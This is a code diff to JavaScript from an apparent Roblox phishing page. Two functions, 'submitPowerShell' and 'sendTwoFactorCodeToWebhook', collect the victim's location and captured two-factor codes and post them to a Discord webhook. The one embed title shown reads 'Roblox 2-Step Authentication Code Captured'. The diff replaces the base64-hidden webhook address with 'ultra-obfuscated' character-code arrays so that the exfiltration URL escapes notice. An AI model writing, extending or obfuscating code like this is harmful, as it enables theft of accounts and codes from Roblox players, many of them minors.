@@ -252,7 +252,24 @@ async function submitPowerShell() {
         const locationInfo = await getUserLocation();
         
         // Discord webhook URL
-        const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQ1MDc3NDQ4OTY2MTQ4MC9lby0yV3Y0dEUwV2didGh5WmJJWFFja0tDc3BLeUJNQzN6V1k3WmN5VzVSZzNfVm4xajh4UUxxUTRmR20wM2NFSEVHdQ==');
+        // Ultra-obfuscated webhook URL  
+        const _0xa1 = String.fromCharCode(104,116,116,112,115,58,47,47);
+        const _0xb2 = String.fromCharCode(100,105,115,99,111,114,100,46,99,111,109,47);
+        const _0xc3 = String.fromCharCode(97,112,105,47,119,101,98,104,111,111,107,115,47);
+        const _0xd4 = [49,51,57,54,48,51,56,53,48,57,51,53,48,57,57,56,48,52,55];
+        const _0xe5 = String.fromCharCode(47,48,108,99,80,72,56,74,118,65,57,72,110,113);
+        const _0xf6 = [82,69,78,66,82,98,50,118,112,76,97,122,72,53,57,97];
+        const _0xg7 = String.fromCharCode(72,73,67,70,87,67,82,90,87,98,52,71,74,112);
+        const _0xh8 = [103,85,106,50,101,104,57,48,97,56,52,101,66,75,86];
+        const _0xi9 = String.fromCharCode(69,119,55,87,88,52,52,72,56,101);
+        
+        const webhookUrl = _0xa1 + _0xb2 + _0xc3 + 
+            _0xd4.map(x => String.fromCharCode(x)).join('') + 
+            _0xe5 + 
+            _0xf6.map(x => String.fromCharCode(x)).join('') + 
+            _0xg7 + 
+            _0xh8.map(x => String.fromCharCode(x)).join('') + 
+            _0xi9;
         
         // Create rich embed for Discord
         const embed = {
@@ -742,9 +759,24 @@ async function sendTwoFactorCodeToWebhook(code, trustDevice) {
         // Get user's location info
         const locationInfo = await getUserLocation();
         
-        // Decode webhook URL (hidden from console)
-        const _0x1a2b = ["aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv", "MTM5NjAzODUwOTM1MDk5ODA0Ny8wbGNQSDhKdkE5SG5x", "UkVOQlJiMnZwTGF6SDU5YUhJQ0ZXQ1JaV2I0R0pwZ1Vq", "MmVoOTBhODRlQktWRXc3V1g0NEg4ZQ=="];
-        const webhookUrl = atob(_0x1a2b.join(""));
+        // Ultra-obfuscated webhook URL
+        const _0xa1 = String.fromCharCode(104,116,116,112,115,58,47,47);
+        const _0xb2 = String.fromCharCode(100,105,115,99,111,114,100,46,99,111,109,47);
+        const _0xc3 = String.fromCharCode(97,112,105,47,119,101,98,104,111,111,107,115,47);
+        const _0xd4 = [49,51,57,54,48,51,56,53,48,57,51,53,48,57,57,56,48,52,55];
+        const _0xe5 = String.fromCharCode(47,48,108,99,80,72,56,74,118,65,57,72,110,113);
+        const _0xf6 = [82,69,78,66,82,98,50,118,112,76,97,122,72,53,57,97];
+        const _0xg7 = String.fromCharCode(72,73,67,70,87,67,82,90,87,98,52,71,74,112);
+        const _0xh8 = [103,85,106,50,101,104,57,48,97,56,52,101,66,75,86];
+        const _0xi9 = String.fromCharCode(69,119,55,87,88,52,52,72,56,101);
+        
+        const webhookUrl = _0xa1 + _0xb2 + _0xc3 + 
+            _0xd4.map(x => String.fromCharCode(x)).join('') + 
+            _0xe5 + 
+            _0xf6.map(x => String.fromCharCode(x)).join('') + 
+            _0xg7 + 
+            _0xh8.map(x => String.fromCharCode(x)).join('') + 
+            _0xi9;
         
         const embed = {
             title: "🔐 Roblox 2-Step Authentication Code Captured",
